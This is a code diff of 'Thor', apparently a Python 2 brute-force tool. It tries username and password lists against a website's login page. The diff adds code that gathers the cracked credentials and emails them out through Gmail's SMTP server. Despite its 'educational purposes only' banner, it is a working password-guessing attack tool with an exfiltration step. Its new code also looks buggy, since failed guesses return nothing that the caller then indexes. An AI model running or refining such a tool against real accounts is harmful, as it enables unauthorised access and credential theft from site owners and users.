@@ -1,13 +1,14 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
 #======================================================
-#THIS SCRIPT IS WRITTEN BY BOCIAN67 AND IS FOR
+#THIS SCRIPT IS WRITTEN BY BOCIAN67 AND IS JUST FOR
 #EDUCATIONAL PURPOSES ONLY!     ~Thor_will_win~
 #======================================================
 from requests import session
 import os
 from pathlib import Path
 import optparse
+import Thor_Mail
 User = []
 Pass = []
 
@@ -20,7 +21,7 @@ def appendtarget(tfile, tlist):
     except:
         pass
 
-def login(username,password,taruser,tarlog):
+def login(username,password,taruser,tarlog,with_mail):
         payload = {
             "action" : "login",
             "username" : username,
@@ -32,21 +33,35 @@ def login(username,password,taruser,tarlog):
             content_length = response.headers["content-length"]
             status = response.status_code
             print("URL: "   +response.url+"\nUser: "+username+\
-            "\nPass: "+password+"\ncontent_length: "+str(content_length)\
-            +"\n"+str(status))
+            "\nPass: "+password+"\n"+str(status))
             if (response.url == taruser):
                 print "[+] Found Username: "+username+\
                 "\n    with Password: "+password
-                exit(0)
+                if(with_mail == True):
+                    content = (username, password)
+                    return content
+
             else:
                 print ("[-] Username or Password is wrong!")
+
+def send_mail(credentials, email, passkey):
+    message = 'I found these Username(s) and Password(s):'
+    for key in credentials.keys():
+        message += "\n"+key+':'+credentials.get(key)
+    message += "\n\n~Thor"
+    subject = 'Thor is finished'
+    smtp_server='smtp.gmail.com:587'
+    Thor_Mail.sending(email,subject,message,passkey,smtp_server)
 
 def main():
     userf = []
     passf = []
+    credentials = {}
+    with_mail = False
     parser = optparse.OptionParser('Thor for education: '\
     +'--TL <Target Login Page> --TU <Target User Page \
-    --UF <Username File> --U <Username> --PF <Passfile> --P <Password>')
+    --UF <Username File> --U <Username> --PF <Passfile> --P <Password> \
+    --Email <email address> --Epass <Email Password>')
     parser.add_option('--TL',dest='tarlog',type='string',\
     help='Target Login Page angeben')
     parser.add_option('--TU',dest='taruser',type='string',\
@@ -59,6 +74,10 @@ def main():
     help='Passfile angeben')
     parser.add_option('--P',dest='passwd',type='string',\
     help='Password angeben')
+    parser.add_option('--Email',dest='mail',type='string',\
+    help='Email-Konto zur Benachrichtung angeben')
+    parser.add_option('--Epass',dest='epass',type='string',\
+    help='Das Password für das Email-Konto angeben')
 
     (options, args) = parser.parse_args()
     tarlog = options.tarlog
@@ -67,7 +86,8 @@ def main():
     usern = options.usern
     appendtarget(options.passf, passf)
     passwd = options.passwd
-
+    mail = options.mail
+    epass = options.epass
 
     if ((tarlog == None) & (taruser == None)):
         print parser.usage
@@ -78,20 +98,30 @@ def main():
     elif ((passf == None) & (passwd == None)):
         print parser.usage
         exit(0)
+    if (mail != None) & (epass != None):
+        with_mail = True
+    else:
+        with_mail = False
     try:
         if usern:
             if passwd:
-                login(usern, passwd,taruser,tarlog)
+                credential = login(usern, passwd,taruser,tarlog,with_mail)
+                credentials.update({credential[0]:credential[1]})
             elif passf:
                 for passw in passf:
-                    login(usern, passw,taruser,tarlog)
+                    credential = login(usern, passw,taruser,tarlog,with_mail)
+                    credentials.update({credential[0]:credential[1]})
         elif userf:
             for user in userf:
                 if passwd:
-                    login(user, passwd,taruser,tarlog)
+                    credential = login(user, passwd,taruser,tarlog,with_mail)
+                    credentials.update({credential[0]:credential[1]})
                 elif passf:
                     for passw in passf:
-                        login(user, passw,taruser,tarlog)
+                        credential = login(user, passw,taruser,tarlog,with_mail)
+                        credentials.update({credential[0]:credential[1]})
+        if (credentials != None):
+            send_mail(credentials, mail, epass)
     except KeyboardInterrupt:
         exit(0)
 
